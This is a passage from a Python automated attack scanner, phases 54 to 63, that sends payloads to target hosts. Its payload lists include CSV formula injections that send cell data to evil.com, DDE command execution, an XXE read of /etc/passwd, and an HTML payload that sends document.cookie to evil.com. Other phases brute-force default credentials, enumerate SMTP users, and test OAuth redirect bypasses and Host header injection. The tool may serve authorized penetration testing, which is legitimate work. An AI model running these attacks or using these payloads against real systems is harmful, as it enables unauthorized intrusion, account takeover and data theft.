            return None
        except Exception:
            return None

    for ep in ws_endpoints:
        sock, _ = _ws_connect(ep)
        if sock is None:
            continue
        for i, payload in enumerate(_WS_FUZZ_PAYLOADS):
            try:
                resp = _ws_send(sock, payload, timeout=3.0)
                if resp:
                    rtext = resp.decode("utf-8", errors="ignore").lower()
                    indicators = ["error", "exception", "traceback", "syntaxerror", "admin", "database",
                                  "password", "token", "secret", "debug", "stack"]
                    detected = [ind for ind in indicators if ind in rtext]
                    if detected:
                        findings.append(
                            f"[ws-fuzz-interesting] {ep} payload#{i} — interesting response: {detected}"
                        )
                    elif len(resp) > 1024:
                        findings.append(f"[ws-fuzz-large-response] {ep} payload#{i} — {len(resp)} bytes")
            except Exception:
                continue
        sock.close()

    if not findings:
        findings.append("[ws-fuzz] No interesting WebSocket fuzzing results")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"54-WS-FUZZ: {len(findings)} WS fuzz findings → {out}")
    return {"54-WS-FUZZ": str(out), "count": len(findings)}


# ────────────────── Phase 55-CSV-INJECT: CSV/Excel Formula Injection ───────────
_CSVI_PAYLOADS = [
    "=CMD|'/C calc'!A0",
    "=HYPERLINK(\"http://evil.com/exfil?data=\"&A1,\"Click here\")",
    "=DDE(\"cmd\";\"/c calc\";\"AAA\")",
    "=MSEXCEL|'/C calc'!A0",
    '+DDE("cmd";"/c calc";"AAA")',
    '=IMPORTXML(CONCATENATE("http://evil.com/?d=",MID(A1,1,50)),"//a")',
    "=WEBSERVICE(\"http://evil.com/\"&A1)",
    "@SUM(1+1)*CMD|'/C calc'!A0",
    "=10+20",
    "=1*1",
]

async def phase_55_CSV_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"55-CSV-INJECT"}:
        return {}
    _out = outdir / "csv_injection.txt"
    if _out.exists() and not force:
        return {"55-CSV-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 55-CSV-INJECT: CSV / Excel formula injection")
    findings: List[str] = []
    _csv_urlopen = _get_urlopener()
    _csv_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "55-CSV-INJECT: no URLs; skipping")
        return {"55-CSV-INJECT": str(_out), "count": 0}
    csv_params = {"export", "download", "report", "csv", "xls", "xlsx", "spreadsheet", "sheet", "format", "type", "file", "name", "filename", "title", "output"}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in csv_params:
                continue
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _CSVI_PAYLOADS:
                try:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(test_url,
                        headers={"User-Agent": "Mozilla/5.0", **_csv_extra_headers})
                    _, resp_headers, body_bytes = await _async_urlopen(_csv_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    ctype = resp_headers.get("Content-Type", "")
                    if "csv" in ctype.lower() or "spreadsheet" in ctype.lower() or "excel" in ctype.lower():
                        if "=" in body[:50] or "+" in body[:50] or "@" in body[:50]:
                            findings.append(
                                f"[csvi-candidate] {test_url} param={param_name} payload={payload[:30]}"
                            )
                            break
                except Exception:
                    continue
    if not findings:
        findings.append("[csv-inject] No CSV injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"55-CSV-INJECT: {len(findings)} CSV injection findings → {out}")
    return {"55-CSV-INJECT": str(out), "count": len(findings)}


# ────────────────── Phase 56-EXPOSED-DB: Exposed Database / Storage Probing ────
_EXPOSED_DB_PATHS = [
    ("/_search", "Elasticsearch"),
    ("/.kibana", "Kibana"),
    ("/. elasticsearch", "Elasticsearch"),
    ("/sockjs-node/info", "Node.js/SockJS"),
    ("/.env", ".env file"),
    ("/.git/config", "Git config"),
    ("/console", "Cloud console"),
    ("/kibana", "Kibana"),
    ("/api/status", "API status"),
    ("/health", "Health endpoint"),
    ("/swagger-ui.html", "Swagger UI"),
    ("/actuator", "Spring Actuator"),
    ("/actuator/health", "Actuator health"),
    ("/actuator/env", "Actuator env"),
]

_EXPOSED_DB_PORTS = [
    (9200, "Elasticsearch HTTP"),
    (9300, "Elasticsearch transport"),
    (5601, "Kibana"),
    (9090, "Prometheus"),
    (3000, "Grafana/API"),
    (6379, "Redis"),
    (27017, "MongoDB"),
    (5432, "PostgreSQL"),
    (3306, "MySQL"),
    (8081, "CouchDB"),
    (5984, "CouchDB"),
    (9000, "Hadoop/HDFS"),
    (50070, "Hadoop NameNode"),
    (8088, "Hadoop YARN"),
    (2375, "Docker API"),
    (8443, "Kubernetes API"),
    (6443, "Kubernetes API"),
    (10250, "Kubelet API"),
    (10255, "Kubelet API"),
]

async def phase_56_EXPOSED_DB(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"56-EXPOSED-DB"}:
        return {}
    _out = outdir / "exposed_databases.txt"
    if _out.exists() and not force:
        return {"56-EXPOSED-DB": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 56-EXPOSED-DB: exposed database / storage probing")
    findings: List[str] = []
    _db_urlopen = _get_urlopener()
    _db_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        hosts = read_lines(outdir / "resolved.txt") if (outdir / "resolved.txt").exists() else []
    if not hosts:
        log("warn", "56-EXPOSED-DB: no hosts; skipping")
        return {"56-EXPOSED-DB": str(_out), "count": 0}
    ports_file = outdir / "ports.txt"
    all_ports: List[str] = read_lines(ports_file) if ports_file.exists() else []
    for host in hosts[:20]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for port, label in _EXPOSED_DB_PORTS:
            port_str = f"{host_clean}:{port}"
            if all_ports and not any(port_str in p or f":{port}" in p for p in all_ports):
                continue
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((host_clean, port))
                sock.close()
                if result == 0:
                    findings.append(f"[exposed-db-port] {host_clean}:{port} — {label} — port open")
                    for path, plabel in _EXPOSED_DB_PATHS:
                        if port in (9200, 9300) and "elasticsearch" in label.lower():
                            url = f"http://{host_clean}:{port}/"
                        elif port == 5601:
                            url = f"http://{host_clean}:{port}/app/kibana"
                        else:
                            url = f"http://{host_clean}:{port}{path}"
                        try:
                            req = urllib.request.Request(url, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_db_extra_headers})
                            s, _, db_body = await _async_urlopen(_db_urlopen, req, timeout=5)
                            if s in (200, 201, 401, 403):
                                body_preview = db_body.decode("utf-8", errors="ignore")[:150]
                                findings.append(
                                    f"  [exposed-service] {url} — HTTP {s} — {label} "
                                    f"body: {body_preview[:100]}"
                                )
                        except Exception:
                            pass
            except Exception:
                continue
    if not findings:
        findings.append("[exposed-db] No exposed database services detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"56-EXPOSED-DB: {len(findings)} exposure findings → {out}")
    return {"56-EXPOSED-DB": str(out), "count": len(findings)}


# ────────────────── Phase 57-DEFAULT-CREDS: Default Credentials Testing ────────
_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", "letmein"), ("admin", "root"),
    ("root", "root"), ("root", "admin"), ("root", "toor"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("guest", "guest"), ("test", "test"), ("demo", "demo"),
    ("administrator", "administrator"), ("admin", "Passw0rd!"),
    ("admin", "p@ssw0rd"), ("admin", "changeme"), ("admin", "1234"),
    ("tomcat", "tomcat"), ("admin", "s3cr3t"),
    ("admin", "1q2w3e4r"), ("admin", "qwerty"),
    ("pi", "raspberry"), ("ubnt", "ubnt"),
    ("manager", "manager"), ("kibana", "kibana"),
    ("elastic", "changeme"), ("kibana", "changeme"),
]

async def phase_57_DEFAULT_CREDS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"57-DEFAULT-CREDS"}:
        return {}
    _out = outdir / "default_creds.txt"
    if _out.exists() and not force:
        return {"57-DEFAULT-CREDS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 57-DEFAULT-CREDS: default credentials probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "57-DEFAULT-CREDS: no hosts; skipping")
        return {"57-DEFAULT-CREDS": str(_out), "count": 0}

    login_paths = ["/login", "/admin", "/admin/login", "/wp-admin", "/api/login",
                   "/api/auth", "/auth", "/signin", "/dashboard", "/manager",
                   "/console", "/jenkins/login", "/admin.html", "/login.html",
                   "/administrator", "/user/login", "/api/v1/login"]

    for host in hosts[:15]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            for username, password in _DEFAULT_CREDS[:10]:
                for path in login_paths[:5]:
                    url = f"{base}{path}"
                    try:
                        creds_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
                        req = urllib.request.Request(url, method="GET",
                            headers={
                                "User-Agent": "Mozilla/5.0",
                                "Authorization": f"Basic {creds_b64}",
                                **_d_extra_headers,
                            })
                        s, _, body = await _async_urlopen(_d_urlopen, req, timeout=8)
                        if s in (200, 201, 204, 302, 303):
                            body_lower = body.decode("utf-8", errors="ignore").lower()
                            skip_indicators = ["invalid", "incorrect", "unauthorized", "forbidden",
                                               "access denied", "wrong", "login failed", "authentication failed"]
                            if not any(ind in body_lower for ind in skip_indicators):
                                findings.append(
                                    f"[default-creds-candidate] {url} — {username}:{password} — HTTP {s}"
                                )
                                break
                    except urllib.error.HTTPError as e:
                        if e.code in (200, 201, 204, 302, 303):
                            findings.append(
                                f"[default-creds-candidate] {url} — {username}:{password} — HTTP {e.code}"
                            )
                    except Exception:
                        continue
                else:
                    continue
                break
            break

    if not findings:
        findings.append("[default-creds] No default credentials accepted")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"57-DEFAULT-CREDS: {len(findings)} default cred findings → {out}")
    return {"57-DEFAULT-CREDS": str(out), "count": len(findings)}


# ────────────────── Phase 58-HOST-INJECT: Host Header Injection ─────────────────
_HOST_INJECT_PAYLOADS = [
    "evil.com",
    "evil.com:443",
    "x: 127.0.0.1@evil.com",
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "192.168.1.1",
    "172.16.0.1",
    "x: 0",
    "x: 1",
    "evil.com\\r\\nX-Forwarded-Host: evil.com",
    "evil.com\\u010d\\nX-Forwarded-Host: evil.com",
    "evil.com\\u2028\\nX-Forwarded-Host: evil.com",
    "evil.com%250d%250aX-Forwarded-Host: evil.com",
    "null",
    "target.com@evil.com",
    "target.com:evil.com",
]

async def phase_58_HOST_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"58-HOST-INJECT"}:
        return {}
    _out = outdir / "host_header_injection.txt"
    if _out.exists() and not force:
        return {"58-HOST-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 58-HOST-INJECT: host header injection testing")
    findings: List[str] = []
    _h_urlopen = _get_urlopener()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "58-HOST-INJECT: no hosts; skipping")
        return {"58-HOST-INJECT": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            url = f"{scheme}{host_clean}/"
            orig_fwd = None
            try:
                base_req = urllib.request.Request(url, method="GET",
                    headers={"User-Agent": "Mozilla/5.0"})
                _, base_headers, base_body = await _async_urlopen(_h_urlopen, base_req, timeout=8)
                orig_fwd = base_headers.get("X-Forwarded-Host", "")
                base_body_str = base_body.decode("utf-8", errors="ignore")
            except Exception:
                base_body_str = ""
            for payload in _HOST_INJECT_PAYLOADS:
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            "Host": payload,
                            "X-Forwarded-Host": payload,
                            "X-Forwarded-Scheme": "http" if payload == "evil.com" else "https",
                        })
                    s, resp_headers, resp_body = await _async_urlopen(_h_urlopen, req, timeout=8)
                    resp_body_str = resp_body.decode("utf-8", errors="ignore")
                    if payload in resp_body_str:
                        findings.append(f"[host-inject-reflected] {url} — Host: {payload} — reflected in body")
                    if "evil.com" in resp_headers.get("Location", "") or "evil.com" in resp_headers.get("Content-Location", ""):
                        findings.append(f"[host-inject-redirect] {url} — Host: {payload} — redirect to attacker domain")
                    if resp_headers.get("X-Forwarded-Host", "") != orig_fwd:
                        findings.append(f"[host-inject-fwd] {url} — Host: {payload} — XFH modified")
                    if resp_headers.get("Set-Cookie", "") and payload != host_clean:
                        findings.append(f"[host-inject-cookie] {url} — Host: {payload} — cookie set under manipulated host")
                    base_len = len(base_body_str)
                    if base_len and abs(len(resp_body_str) - base_len) > 100:
                        findings.append(f"[host-inject-diff] {url} — Host: {payload} — response size differs by {abs(len(resp_body_str) - base_len)} bytes")
                except Exception:
                    continue
            break
    if not findings:
        findings.append("[host-inject] No host header injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"58-HOST-INJECT: {len(findings)} host header injection findings → {out}")
    return {"58-HOST-INJECT": str(out), "count": len(findings)}


# ────────────────── Phase 59-EMAIL-SEC: Email Security (SPF/DMARC/DKIM) ━━━━━━━━━
async def phase_59_EMAIL_SEC(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"59-EMAIL-SEC"}:
        return {}
    _out = outdir / "email_security.txt"
    if _out.exists() and not force:
        return {"59-EMAIL-SEC": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 59-EMAIL-SEC: email security (SPF/DMARC/DKIM)")
    findings: List[str] = []

    async def _dns_query(record_type: str, name: str) -> List[str]:
        if t.has("dig"):
            try:
                rc, stdout, _ = await _run_cmd_clear_proxy(
                    ["dig", "+short", record_type, name], timeout=10,
                )
                if rc == 0:
                    return [ln.decode().strip() for ln in stdout.splitlines() if ln.strip()]
            except Exception:
                pass
        try:
            rc, stdout, _ = await _run_cmd_clear_proxy(
                ["nslookup", "-type=" + record_type, name], timeout=10,
            )
            if rc >= 0:
                text = stdout.decode(errors="ignore")
                results = []
                for ln in text.splitlines():
                    ln = ln.strip()
                    if "canonical name" in ln.lower() or "name =" in ln.lower():
                        parts = ln.split("=")
                        if len(parts) > 1:
                            results.append(parts[-1].strip().rstrip("."))
                return results
        except Exception:
            pass
        return []

    spf_records = await _dns_query("TXT", domain)
    spf_found = [r for r in spf_records if "v=spf1" in r]
    if spf_found:
        for spf in spf_found:
            if "~all" in spf:
                findings.append(f"[spf-softfail] {domain} — SPF uses ~all (softfail): {spf[:200]}")
            elif "-all" in spf:
                findings.append(f"[spf-hardfail] {domain} — SPF uses -all (hardfail): {spf[:200]}")
            elif "?all" in spf or "+all" in spf:
                findings.append(f"[spf-weak] {domain} — SPF uses ?all/+all (neutral/pass-all): {spf[:200]}")
            else:
                findings.append(f"[spf-present] {domain} — SPF record exists: {spf[:200]}")
    else:
        findings.append(f"[spf-missing] {domain} — no SPF record found (domain is spoofable)")

    dmarc_records = await _dns_query("TXT", f"_dmarc.{domain}")
    dmarc_found = [r for r in dmarc_records if "v=DMARC1" in r]
    if dmarc_found:
        for dmarc in dmarc_found:
            dmarc_lower = dmarc.lower()
            if "p=reject" in dmarc_lower:
                findings.append(f"[dmarc-reject] {domain} — DMARC policy=reject: {dmarc[:200]}")
            elif "p=quarantine" in dmarc_lower:
                findings.append(f"[dmarc-quarantine] {domain} — DMARC policy=quarantine: {dmarc[:200]}")
            elif "p=none" in dmarc_lower:
                findings.append(f"[dmarc-none] {domain} — DMARC policy=none (monitoring only): {dmarc[:200]}")
            else:
                findings.append(f"[dmarc-present] {domain} — DMARC record exists: {dmarc[:200]}")
            if "rua=" not in dmarc_lower and "ruf=" not in dmarc_lower:
                findings.append(f"[dmarc-no-reporting] {domain} — DMARC has no reporting addresses")
    else:
        findings.append(f"[dmarc-missing] {domain} — no DMARC record found (domain is spoofable)")

    for prefix in ["google._domainkey", "selector1._domainkey", "default._domainkey",
                   "dkim._domainkey", "mail._domainkey", "s1._domainkey", "s2._domainkey"]:
        dkim_records = await _dns_query("TXT", f"{prefix}.{domain}")
        if dkim_records:
            findings.append(f"[dkim-present] {domain} — DKIM key found at {prefix}: {dkim_records[0][:100]}")
            break
    else:
        findings.append(f"[dkim-not-found] {domain} — no common DKIM selectors found")

    if not findings:
        findings.append(f"[email-sec] {domain} — email security posture assessed")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"59-EMAIL-SEC: {len(findings)} email security findings → {out}")
    return {"59-EMAIL-SEC": str(out), "count": len(findings)}


# ────────────────── Phase 60-SMTP-ENUM: SMTP Enumeration & Email Bombing ────────
_SMTP_COMMANDS = [
    "VRFY root",
    "VRFY admin",
    "VRFY test",
    "VRFY nobody",
    "EXPN root",
    "EXPN admin",
    "EXPN test",
    "RCPT TO:<root@{domain}>",
    "RCPT TO:<admin@{domain}>",
    "RCPT TO:<test@{domain}>",
]

async def phase_60_SMTP_ENUM(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"60-SMTP-ENUM"}:
        return {}
    _out = outdir / "smtp_enumeration.txt"
    if _out.exists() and not force:
        return {"60-SMTP-ENUM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 60-SMTP-ENUM: SMTP enumeration & abuse testing")
    findings: List[str] = []
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    mx_hosts: List[str] = []
    if t.has("dig"):
        try:
            rc, stdout, _ = await _run_cmd_clear_proxy(
                ["dig", "+short", "MX", domain], timeout=10,
            )
            if rc == 0:
                for ln in stdout.decode().splitlines():
                    ln = ln.strip()
                    parts = ln.split()
                    if len(parts) >= 2:
                        mx_hosts.append(parts[-1].rstrip("."))
                    elif ln and not ln.startswith(";"):
                        mx_hosts.append(ln.rstrip("."))
        except Exception:
            pass
    smtp_targets = mx_hosts[:5] if mx_hosts else [h for h in hosts[:3] if ":" not in h]
    for smtp_host in smtp_targets:
        smtp_host_clean = smtp_host.split(":")[0].strip()
        if not smtp_host_clean:
            continue
        for port in (25, 587, 465, 2525):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((smtp_host_clean, port))
                if result != 0:
                    sock.close()
                    continue
                sock.settimeout(10)
                banner = sock.recv(1024).decode("utf-8", errors="ignore")
                findings.append(f"[smtp-open] {smtp_host_clean}:{port} — SMTP banner: {banner[:100].strip()}")
                for cmd in _SMTP_COMMANDS:
                    try:
                        cmd_filled = cmd.replace("{domain}", domain)
                        sock.sendall(f"{cmd_filled}\r\n".encode())
                        resp = sock.recv(1024).decode("utf-8", errors="ignore")
                        if any(code in resp for code in ["250", "251", "252"]):
                            findings.append(f"[smtp-enum] {smtp_host_clean}:{port} — {cmd_filled} — {resp[:80].strip()}")
                    except Exception:
                        continue
                sock.close()
            except Exception:
                continue
    if not findings:
        findings.append("[smtp-enum] No open SMTP services detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"60-SMTP-ENUM: {len(findings)} SMTP findings → {out}")
    return {"60-SMTP-ENUM": str(out), "count": len(findings)}


# ────────────────── Phase 61-OAUTH-ADV: Advanced OAuth Bypass Variants ─────────
_OAUTH_ADV_PATHS = [
    "/oauth/callback", "/oauth2/callback", "/auth/callback",
    "/login/oauth2/code", "/oauth/authorize", "/oauth/token",
    "/oauth2/authorize", "/oauth2/token", "/auth/realms",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

_OAUTH_ADV_REDIRECT_BYPASSES = [
    "https://evil.com",
    "https://evil.com/@{domain}",
    "https://{domain}.evil.com",
    "https://{domain}@evil.com",
    "https://evil.com/{domain}",
    "https://evil.com/?url=https://{domain}",
    "https://{domain}.evil.com/",
    "https://evil.com\\@{domain}",
    "https://evil.com#@{domain}",
    "https://{domain}%40evil.com",
    "data:text/html,<script>location='https://evil.com'</script>",
    "javascript:document.location='https://evil.com'",
]

async def phase_61_OAUTH_ADV(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"61-OAUTH-ADV"}:
        return {}
    _out = outdir / "oauth_advanced.txt"
    if _out.exists() and not force:
        return {"61-OAUTH-ADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 61-OAUTH-ADV: advanced OAuth redirect_uri bypass testing")
    findings: List[str] = []
    _o_urlopen = _get_urlopener()
    _o_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "61-OAUTH-ADV: no hosts; skipping")
        return {"61-OAUTH-ADV": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://",):
            base = f"{scheme}{host_clean}"
            for path in _OAUTH_ADV_PATHS:
                url = f"{base}{path}"
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers})
                    s, _, _ = await _async_urlopen(_o_urlopen, req, timeout=8)
                    if s not in (200, 302, 301, 303, 307):
                        continue
                    findings.append(f"[oauth-endpoint] {url} — HTTP {s}")
                    for bypass in _OAUTH_ADV_REDIRECT_BYPASSES:
                        bypass_url = bypass.replace("{domain}", domain)
                        for param in ("redirect_uri", "redirect", "callback", "return", "next",
                                      "url", "continue", "destination", "r"):
                            test_url = f"{url}?{param}={bypass_url}"
                            try:
                                treq = urllib.request.Request(test_url, method="GET",
                                    headers={"User-Agent": "Mozilla/5.0", **_o_extra_headers})
                                ts, theaders, tbody = await _async_urlopen(_o_urlopen, treq, timeout=8)
                                tbody_str = tbody.decode("utf-8", errors="ignore")
                                if "evil.com" in tbody_str:
                                    findings.append(
                                        f"[oauth-redirect-bypass] {test_url} — param={param} "
                                        f"redirect_uri={bypass_url} — reflected in response"
                                    )
                                if "evil.com" in theaders.get("Location", ""):
                                    findings.append(
                                        f"[oauth-redirect-bypass] {test_url} — param={param} "
                                        f"redirect_uri={bypass_url} — redirect to attacker domain"
                                    )
                            except Exception:
                                continue
                except Exception:
                    continue
    if not findings:
        findings.append("[oauth-adv] No advanced OAuth bypasses detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"61-OAUTH-ADV: {len(findings)} OAuth findings → {out}")
    return {"61-OAUTH-ADV": str(out), "count": len(findings)}


# ────────────────── Phase 62-LOG-INJECT: Log Injection Testing ─────────────────
_LOG_INJECT_PAYLOADS = [
    "\r\n[INFO] User admin logged in from 127.0.0.1\r\n",
    "\r\n[ERROR] Database connection failed: user=admin password=secret\r\n",
    "\r\n[SECURITY] User authentication bypass successful\r\n",
    "\r\n[INFO] Password reset token: abc123def456\r\n",
    "\r\n[INFO] Credit card: 4111-1111-1111-1111\r\n",
    "\r\n[INFO] Internal IP: 10.0.0.1\r\n",
    "\n[INFO] Injected log entry\n",
    "\r\n[CRITICAL] Stack trace: java.lang.RuntimeException: null\r\n",
]

async def phase_62_LOG_INJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"62-LOG-INJECT"}:
        return {}
    _out = outdir / "log_injection.txt"
    if _out.exists() and not force:
        return {"62-LOG-INJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 62-LOG-INJECT: log injection / log forging detection")
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "62-LOG-INJECT: no URLs; skipping")
        return {"62-LOG-INJECT": str(_out), "count": 0}
    log_params = {"log", "debug", "trace", "level", "logging", "loglevel", "verbose", "v", "output"}
    log_headers = ["X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host", "Referer", "User-Agent"]
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)][:30]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in log_params:
                continue
            for payload in _LOG_INJECT_PAYLOADS:
                try:
                    test_qs = qs.copy()
                    test_qs[param_name] = [payload]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=10)
                    if s in (200, 201, 302):
                        findings.append(
                            f"[log-inject-param] {test_url} — param={param_name} — HTTP {s}"
                        )
                        break
                except Exception:
                    continue
    for host in read_lines(outdir / "hosts.txt") if (outdir / "hosts.txt").exists() else []:
        host_clean = host.split(":")[0].strip() if ":" in host else host.strip()
        if not host_clean:
            continue
        for header_name in log_headers:
            for payload in _LOG_INJECT_PAYLOADS[:3]:
                try:
                    req = urllib.request.Request(f"https://{host_clean}/", method="GET",
                        headers={
                            "User-Agent": "Mozilla/5.0",
                            header_name: payload,
                            **_l_extra_headers,
                        })
                    s, _, _ = await _async_urlopen(_l_urlopen, req, timeout=8)
                    if s in (200, 201):
                        findings.append(f"[log-inject-header] https://{host_clean}/ — header={header_name} — HTTP {s}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[log-inject] No log injection vectors detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"62-LOG-INJECT: {len(findings)} log injection findings → {out}")
    return {"62-LOG-INJECT": str(out), "count": len(findings)}


# ────────────────── Phase 63-DOC-ATTACK: Document-Based Attack Vectors ──────────
_DOC_ATTACK_ENDPOINTS = [
    "/upload", "/api/upload", "/file/upload", "/document/upload",
    "/import", "/api/import", "/csv/import", "/bulk/import",
    "/api/files", "/api/documents",
    "/api/v1/upload", "/api/v2/upload",
]
_DOC_ATTACK_PAYLOADS = [
    ("csv", "=CMD|'/C ping 127.0.0.1'!A0"),
    ("csv", "=HYPERLINK(\"http://evil.com/exfil\",\"Click\")"),
    ("csv", '=DDE("cmd";"/c calc";"AAA")'),
    ("csv", "=WEBSERVICE(\"http://evil.com/\")"),
    ("xlsx", "=EXEC(\"calc\")"),
    ("docx", "${7*7}"),
    ("pdf", "<script>app.alert(1)</script>"),
    ("xml", '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
    ("svg", '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
    ("html", "<html><body><script>fetch('http://evil.com/steal?cookie='+document.cookie)</script></body></html>"),
]

async def phase_63_DOC_ATTACK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"63-DOC-ATTACK"}:
        return {}
    _out = outdir / "document_attacks.txt"
    if _out.exists() and not force:
        return {"63-DOC-ATTACK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 63-DOC-ATTACK: document-based attack vector detection")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "63-DOC-ATTACK: no hosts; skipping")
        return {"63-DOC-ATTACK": str(_out), "count": 0}
    for host in hosts[:10]:
        host_clean = host.split(":")[0].strip()
        if not host_clean:
            continue
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host_clean}"
            for endpoint in _DOC_ATTACK_ENDPOINTS:
                url = f"{base}{endpoint}"
                try:
                    req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_d_extra_headers})
                    s, _, _ = await _async_urlopen(_d_urlopen, req, timeout=8)
                    if s not in (200, 201, 202, 204, 401, 403, 405):
                        continue
                    findings.append(f"[doc-attack-endpoint] {url} — HTTP {s}")
                    for fmt, payload in _DOC_ATTACK_PAYLOADS:
                        try:
                            content_map = {
                                "csv": "text/csv",
